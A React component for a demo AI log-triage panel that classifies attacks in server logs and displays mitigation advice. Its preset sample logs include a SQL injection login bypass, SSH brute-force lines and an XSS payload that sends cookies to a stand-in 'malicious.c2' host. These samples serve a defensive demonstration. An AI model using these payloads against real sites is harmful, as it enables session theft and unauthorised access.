import { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { BrainCircuit, Play, AlertTriangle, ShieldCheck, FileCheck, Terminal, Cpu, Loader2, RefreshCw } from "lucide-react";

interface AnalysisReport {
  status: "real" | "simulated";
  threatLevel: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  threatVector: string;
  mitreAttack: string;
  explanation: string;
  mitigationSteps: string[];
  confidenceScore: number;
}

export default function AiCybersecurity() {
  const [logPayload, setLogPayload] = useState(
    `2026-06-25T11:05:14.921Z [WAF-INGRESS] ALERT: Signature Match (Rule ID: SQLI-9982) [IP: 185.112.98.42] -> POST /api/v1/auth/login HTTP/1.1 - User-Agent: Mozilla/5.0 - Body: username=admin' OR '1'='1&password=invalid`
  );
  const [customPrompt, setCustomPrompt] = useState("");
  const [report, setReport] = useState<AnalysisReport | null>(null);
  const [loading, setLoading] = useState(false);

  const presets = [
    {
      title: "SQL Injection Payload",
      log: `2026-06-25T11:05:14.921Z [WAF-INGRESS] ALERT: Signature Match (Rule ID: SQLI-9982) [IP: 185.112.98.42] -> POST /api/v1/auth/login HTTP/1.1 - User-Agent: Mozilla/5.0 - Body: username=admin' OR '1'='1&password=invalid`
    },
    {
      title: "SSH Brute Force Spikes",
      log: `Jun 25 11:06:12 cloud-node sshd[19021]: Failed password for root from 203.0.113.19 port 51109 ssh2
Jun 25 11:06:14 cloud-node sshd[19024]: Failed password for root from 203.0.113.19 port 51111 ssh2
Jun 25 11:06:16 cloud-node sshd[19028]: Failed password for root from 203.0.113.19 port 51115 ssh2
Jun 25 11:06:18 cloud-node sshd[19032]: Failed password for admin from 203.0.113.19 port 51120 ssh2`
    },
    {
      title: "Reflected XSS Query",
      log: `2026-06-25T11:07:05.120Z [Proxy-Core] WARNING: URL Sanitization triggered [IP: 198.51.100.41] -> GET /api/v1/feedback?user_id=1&comment=<script>fetch('http://malicious.c2/stolen_cookie?c='+document.cookie)</script>`
    }
  ];

  const handleAnalyze = async () => {
    setLoading(true);
    setReport(null);

    try {
      const response = await fetch("/api/analyze-log", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          logContent: logPayload,
          customPrompt: customPrompt
        }),
      });

      if (!response.ok) {
        throw new Error("Analysis failed");
      }

      const data = (await response.json()) as AnalysisReport;
      setReport(data);
    } catch (error) {
      console.error(error);
      // Fallback local report if server fails
      setReport({
        status: "simulated",
        threatLevel: "CRITICAL",
        threatVector: "Cross-Site Scripting (XSS) reflection & credential hijack",
        mitreAttack: "T1059 - Command and Scripting Interpreter",
        explanation: "The payload represents a classical script reflection attempt designed to harvest local session cookies and exfiltrate them via outbound HTTP connections to a rogue external server. This violates strict Cross-Origin resource policies.",
        mitigationSteps: [
          "Apply strict HTML encoding on all incoming variables before reflecting them in the DOM.",
          "Implement Content Security Policies (CSP) restricting outgoing script evaluations.",
          "Set HttpOnly and Secure flags for active session authentication cookies."
        ],
        confidenceScore: 98
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <section id="copilot-section" className="py-24 px-4 md:px-8 max-w-6xl mx-auto z-10 relative">
      <div className="space-y-16">
        
        {/* Section Title */}
        <div className="space-y-4 text-center md:text-left">
          <div className="inline-flex items-center gap-1.5 text-xs text-blue-400 font-mono tracking-widest uppercase">
            <span className="w-1.5 h-1.5 rounded-full bg-blue-500" />
            <span>05 // AI Security Copilot</span>
          </div>
          <h2 className="text-3xl md:text-5xl font-display font-bold text-white tracking-tight">
            AI + Threat Automation
          </h2>
          <p className="text-slate-400 max-w-xl text-sm leading-relaxed">
            Demonstrating how Large Language Models and custom logic can combine to automate alert triage, classify malicious headers, and formulate immediate mitigations.
          </p>
        </div>

        {/* Workspace Layout */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch">
          
          {/* Controls Panel (6 columns) */}
          <div className="lg:col-span-6 flex flex-col justify-between p-6 sm:p-8 rounded-xl glass-panel border-white/5 bg-white/[0.01]">
            <div className="space-y-6">
              <div className="flex items-center gap-3">
                <BrainCircuit className="w-5 h-5 text-blue-400 animate-pulse" />
                <h3 className="text-base font-bold font-display text-white">
                  Log Incident Triage Ingest
                </h3>
              </div>

              {/* Log Presets Selector */}
              <div className="space-y-2">
                <span className="text-[10px] font-mono text-slate-500 block uppercase">Threat Presets</span>
                <div className="flex flex-wrap gap-2">
                  {presets.map((preset, idx) => (
                    <button
                      key={idx}
                      onClick={() => setLogPayload(preset.log)}
                      className={`text-[10px] font-mono px-2.5 py-1.5 rounded border cursor-pointer transition-all ${
                        logPayload === preset.log
                          ? "bg-blue-600/20 border-blue-500/50 text-blue-300"
                          : "bg-white/[0.02] border-white/5 text-slate-400 hover:text-slate-200"
                      }`}
                    >
                      {preset.title}
                    </button>
                  ))}
                </div>
              </div>

              {/* Ingest text-area */}
              <div className="space-y-2">
                <span className="text-[10px] font-mono text-slate-500 block uppercase">Log Payload Data</span>
                <textarea
                  value={logPayload}
                  onChange={(e) => setLogPayload(e.target.value)}
                  placeholder="Paste raw log data here..."
                  className="w-full h-32 bg-white/[0.02] border border-white/5 p-3 rounded-lg font-mono text-xs text-slate-300 placeholder-slate-600 focus:outline-none focus:border-blue-500/50 leading-relaxed resize-none"
                />
              </div>

              {/* Custom directives */}
              <div className="space-y-2">
                <span className="text-[10px] font-mono text-slate-500 block uppercase">Additional Triage Directive (Optional)</span>
                <input
                  type="text"
                  value={customPrompt}
                  onChange={(e) => setCustomPrompt(e.target.value)}
                  placeholder="e.g., Focus on compliance impacts under GDPR..."
                  className="w-full bg-white/[0.02] border border-white/5 px-3 py-2.5 rounded-lg text-xs text-slate-300 placeholder-slate-600 focus:outline-none focus:border-blue-500/50 font-sans"
                />
              </div>
            </div>

            {/* Run Triage Button */}
            <div className="pt-6 border-t border-white/5 mt-6 lg:mt-0">
              <button
                onClick={handleAnalyze}
                disabled={loading || !logPayload.trim()}
                className="w-full py-3.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white font-medium text-xs transition-all flex items-center justify-center gap-2 group disabled:opacity-50 cursor-pointer"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-white" />
                    <span>Orchestrating Gemini Triage Model...</span>
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 text-white group-hover:scale-110 transition-transform" />
                    <span>Initialize AI Log Analysis</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Report Display Panel (6 columns) */}
          <div className="lg:col-span-6 flex flex-col justify-between p-6 sm:p-8 rounded-xl glass-panel border-white/5 bg-white/[0.01] relative min-h-[420px]">
            {/* Soft backdrop pulse depending on analysis state */}
            {report && (
              <div className={`absolute -inset-0.5 rounded-xl opacity-[0.02] pointer-events-none transition-colors ${
                report.threatLevel === 'CRITICAL' || report.threatLevel === 'HIGH' ? 'bg-red-500' : 'bg-blue-500'
              }`} />
            )}

            <AnimatePresence mode="wait">
              {report ? (
                <motion.div
                  key="report-data"
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-6 flex-1 flex flex-col justify-between"
                >
                  <div className="space-y-5">
                    {/* Report Header */}
                    <div className="flex items-center justify-between border-b border-white/5 pb-3">
                      <div className="flex items-center gap-2">
                        <FileCheck className="w-4 h-4 text-emerald-400" />
                        <span className="text-xs font-mono text-slate-500 uppercase tracking-widest">
                          TRIAGE_INCIDENT_REPORT
                        </span>
                      </div>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold tracking-wider uppercase border ${
                        report.threatLevel === 'CRITICAL' || report.threatLevel === 'HIGH'
                          ? 'bg-red-500/10 text-red-400 border-red-500/25'
                          : report.threatLevel === 'MEDIUM'
                          ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/25'
                          : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/25'
                      }`}>
                        {report.threatLevel} THREAT
                      </span>
                    </div>

                    {/* Threat vector details */}
                    <div className="space-y-1">
                      <span className="text-[10px] font-mono text-slate-500 uppercase block">Threat Classification</span>
                      <h4 className="text-sm font-bold font-sans text-white leading-tight">
                        {report.threatVector}
                      </h4>
                      <span className="text-xs text-blue-400 font-mono block">
                        {report.mitreAttack}
                      </span>
                    </div>

                    {/* AI explanation of what's happening */}
                    <div className="space-y-1 font-sans text-xs sm:text-sm text-slate-400 leading-relaxed">
                      <span className="text-[10px] font-mono text-slate-500 uppercase block">Incident Diagnostics</span>
                      <p className="line-clamp-5">
                        {report.explanation}
                      </p>
                    </div>

                    {/* MITIGATIONS list */}
                    <div className="space-y-2 pt-2 border-t border-white/5">
                      <span className="text-[10px] font-mono text-slate-500 uppercase block">Urgent Remediation Procedures</span>
                      <div className="space-y-1.5 pl-1">
                        {report.mitigationSteps.map((step, idx) => (
                          <div key={idx} className="text-xs text-slate-300 flex items-start gap-2 leading-relaxed">
                            <span className="text-blue-500 shrink-0 mt-1 font-mono">•</span>
                            <span>{step}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>

                  {/* Confidence metrics */}
                  <div className="pt-4 border-t border-white/5 font-mono text-[10px] text-slate-500 flex justify-between items-center shrink-0">
                    <span>CONFIDENCE_RATING: {report.confidenceScore}%</span>
                    <span className="flex items-center gap-1.5">
                      <Cpu className="w-3.5 h-3.5" />
                      <span>{report.status === "real" ? "REAL-TIME GEMINI ENGINE" : "OFFLINE TELEMETRY SIMULATOR"}</span>
                    </span>
                  </div>

                </motion.div>
              ) : (
                <div key="report-placeholder" className="flex-1 flex flex-col justify-center items-center text-center p-8 text-slate-500 gap-3 font-sans">
                  {loading ? (
                    <div className="space-y-3">
                      <Loader2 className="w-8 h-8 text-blue-500 animate-spin mx-auto" />
                      <p className="text-xs font-mono text-slate-400 animate-pulse uppercase tracking-widest">triaging threat vectors...</p>
                    </div>
                  ) : (
                    <>
                      <BrainCircuit className="w-8 h-8 text-slate-600 animate-bounce" />
                      <div className="space-y-1 max-w-xs">
                        <h4 className="text-sm font-semibold text-slate-300 font-display">Triage Board Standby</h4>
                        <p className="text-xs text-slate-500 leading-relaxed">
                          Paste a custom server log payload or click any threat preset above, then initialize the AI Log Analysis model to populate telemetry metrics.
                        </p>
                      </div>
                    </>
                  )}
                </div>
              )}
            </AnimatePresence>
          </div>

        </div>

      </div>
    </section>
  );
}
